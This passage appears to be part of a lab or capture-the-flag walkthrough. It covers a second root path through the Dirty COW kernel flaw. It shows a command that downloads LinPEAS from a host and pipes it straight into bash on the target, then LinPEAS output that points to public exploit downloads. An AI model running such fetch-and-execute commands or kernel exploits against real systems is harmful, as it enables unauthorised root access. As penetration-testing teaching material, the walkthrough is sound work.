## Alternate Root Path – Dirty COW Exploit

Once access is obtained to any user account with either SSH or an interactive shell, it's possible to begin a second root escalation path using the well-known **Dirty COW** vulnerability (CVE-2016-5195).

### 1. Privilege Escalation Enumeration

To check for local privilege escalation vectors, it's best to automate the process. The tool [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is commonly used for this.

LinPEAS scans for a wide range of misconfigurations and vulnerable components, such as:

* World-writable or misconfigured system files
* SUID binaries
* Kernel version exploits
* Accessible credentials or backups

**Run LinPEAS from the target machine:**

```bash
# Download linpeas.sh from a web server or transfer manually
curl http://<host-ip>/linpeas.sh | bash
```

---

```bash
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```
---

This method provides direct root access from any interactive user shell, assuming the kernel is vulnerable and not patched. Always verify that the system's version aligns with Dirty COW’s impact range before attempting exploitation.

